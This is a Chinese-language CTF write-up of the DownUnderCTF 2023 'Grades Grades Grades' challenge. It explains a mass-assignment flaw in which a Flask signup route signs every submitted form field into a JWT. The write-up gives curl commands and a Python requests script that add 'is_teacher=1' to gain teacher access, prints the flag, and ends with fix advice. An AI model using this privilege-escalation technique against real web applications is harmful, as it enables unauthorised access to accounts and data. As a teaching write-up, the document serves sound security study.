# DownUnderCTF 2023 Grades Grades Grades Writeup

## 题目简述

注册接口把整个表单字典原样签进 HS256 JWT，并将令牌写入 `auth_token` Cookie。前端表单只展示学号、邮箱和密码，但后端没有为允许字段建立白名单。攻击者可以额外提交 `is_teacher`，让服务器亲自签发教师身份令牌，再访问仅教师可见的 flag 路由。

这是服务端批量赋值导致的权限提升，不需要破解 JWT 密钥或伪造签名。

## 解题过程

注册处理逻辑的关键两行是：

```python
jwt_data = request.form.to_dict()
jwt_cookie = current_app.auth.create_token(jwt_data)
```

而教师鉴权直接信任 JWT 中的声明：

```python
data = decode_token(token)
if data['is_teacher']:
    request.user_data = data
else:
    return jsonify({'message': 'Invalid token'}), 401
```

HTML 中没有 `is_teacher` 输入框并不构成安全边界。手工添加一个真值即可：

```bash
curl -i -c cookies.txt -X POST 'http://TARGET/signup' \
  --data 'stu_num=10001' \
  --data 'stu_email=student@example.com' \
  --data 'password=test' \
  --data 'is_teacher=1'

curl -b cookies.txt 'http://TARGET/grades_flag'
```

Flask 将字符串 `"1"` 放入 JWT；Python 对非空字符串求布尔值为真，所以 `requires_teacher` 放行请求。使用 `requests.Session` 也可以完整复现：

```python
import re
import requests

base = "http://TARGET"
session = requests.Session()
session.post(
    f"{base}/signup",
    data={
        "stu_num": "10001",
        "stu_email": "student@example.com",
        "password": "test",
        "is_teacher": "1",
    },
)
response = session.get(f"{base}/grades_flag")
print(re.search(r"DUCTF\{[^}]+\}", response.text).group(0))
```

返回的 flag 是：

```text
DUCTF{Y0u_Kn0W_M4Ss_A5s1GnM3Nt_c890ne89c3}
```

## 方法总结

JWT 签名只能证明声明由服务器签发，不能证明服务器在签发前正确授权。此题把不受信表单字段整体复制进身份载荷，导致攻击者可选择自己的角色。修复时应显式构造允许的声明，并在服务端固定新用户角色；权限检查也应查询服务端状态，而不是盲信客户端可影响的注册数据。
